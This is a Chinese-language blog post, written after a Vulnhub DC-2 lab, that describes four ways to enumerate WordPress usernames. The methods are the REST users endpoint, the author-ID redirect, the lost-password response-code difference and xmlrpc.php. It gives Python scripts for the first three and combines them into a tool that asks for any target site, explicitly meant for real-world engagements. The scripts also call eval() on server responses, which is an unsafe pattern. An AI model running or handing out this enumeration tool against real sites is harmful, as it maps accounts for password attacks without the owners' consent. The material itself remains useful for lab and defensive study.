---
layout:     post
title:      总结wordpress枚举用户名的四种方式
subtitle:   如何枚举wordpress用户名？
date:       2019-06-29
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - 漏洞
    - WordPress
---
# 前言
前几天在做Vulnhub DC-2 靶机的时候，80端口上的Web应用程序是WordPress，当时想用WPScan来枚举用户的，但是Kali Linux 和Parrot OS 上的WPScan都用不了了。于是，我上了google去搜了一些关于WordPress枚举用户的文章，顺便记录一下，以后实战中遇到WordPress的站可以多一些尝试！
# 方式
## 方式一：利用接口
通过这个接口，可以获取到部分的用户名
```
/index.php/wp-json/wp/v2/users/?per_page=100&page=1
```
如下图所示，找到了2个用户名，虽然不全，但是也是一个可以利用的点：
![图片](../../../../img/wp-user-1.png)

下面通过Python脚本来自动实现：
```
import requests

users_list = []
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}

response = requests.get(target + "/index.php/wp-json/wp/v2/users/?per_page=100&page=1",headers=headers)
r_text = eval(response.text)
for i in range(0,10):
    users_list.append(r_text[i]['name'])
```

## 方式二：利用遍历author参数
如果存在author为1的，就会重定向到作者页面
```
/?author=1
```
如下图所示，可以看到页面的标题变成了admin，因此可以通过脚本来做到枚举用户名：
![图片](../../../../img/wp-user-2.png)
python代码如下：
```
import requests
from bs4 import BeautifulSoup
users_list = []

for i in range(1,10):
    r = requests.get(target+"/?author=%s" % i)
    if r.status_code == 200:
        con = r.content
        soup = BeautifulSoup(con, "html.parser")
        title = soup.head.title.string
        title = title.strip()
        title = title.split("–")
        title = title[0].strip()
        if title not in users_list:
            users_list.append(title)
```
## print(users_list)

方式三：后台忘记密码功能
由于后台密码忘记功能那里，会让你输入用户名，如果存在就302重定向到下一个页面，如果不存在状态码是200。因此写了一个python脚本：
```
import requests
users_list = []

post_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
           'Content-Type':'application/x-www-form-urlencoded'}
usernames = open("users_list.txt","r",encoding='utf-8',errors='ignore')
for user in usernames:
    user = user.strip()
    data = "user_login=%s&redirect_to=&wp-submit=Get+New+Password" % user
    forget_r = requests.post(target + "/wp-login.php?action=lostpassword",headers=post_headers,data=data,allow_redirects=False)
    if forget_r.status_code == 302:
        if user not in users_list:
            users_list.append(user)
print(users_list)
usernames.close()
```

## 方式四：通过xmlrpc.php
这个方法，我这本地测试没成功，国外有一篇文章写的很详细，可以看一下：[https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

# Python脚本自动化
### 代码
这里就把上述的三种方式整合一下，打造一个用来枚举WordPress用户名的小工具。
```
#!/usr/bin/python
# -*- coding:utf-8 -*-
# wirter:En_dust
# Blog:https://www.opensource-sec.com/
import requests
from bs4 import BeautifulSoup
users_list = []
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}

def enumerat_user(target):
    try:
        response = requests.get(target + "/index.php/wp-json/wp/v2/users/?per_page=100&page=1",headers=headers)
        r_text = eval(response.text)
        for i in range(0,10):
            users_list.append(r_text[i]['name'])
    except:
        pass
    finally:
        print(users_list)

    for i in range(1,10):
        r = requests.get(target+"/?author=%s" % i)
        if r.status_code == 200:
            con = r.content
            soup = BeautifulSoup(con, "html.parser")
            title = soup.head.title.string
            title = title.strip()
            title = title.split("–")
            title = title[0].strip()
            if title not in users_list:
                users_list.append(title)
    print(users_list)

    post_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
               'Content-Type':'application/x-www-form-urlencoded'}
    usernames = open("users_list.txt","r",encoding='utf-8',errors='ignore')
    for user in usernames:
        user = user.strip()
        data = "user_login=%s&redirect_to=&wp-submit=Get+New+Password" % user
        forget_r = requests.post(target + "/wp-login.php?action=lostpassword",headers=post_headers,data=data,allow_redirects=False)
        if forget_r.status_code == 302:
            if user not in users_list:
                users_list.append(user)
    print(users_list)
    usernames.close()


def main():
    print("WordPress枚举用户名工具")
    website = input("输入一个由WordPress搭建的网站：")
    enumerat_user(website)


if __name__ == '__main__':
```
    main()


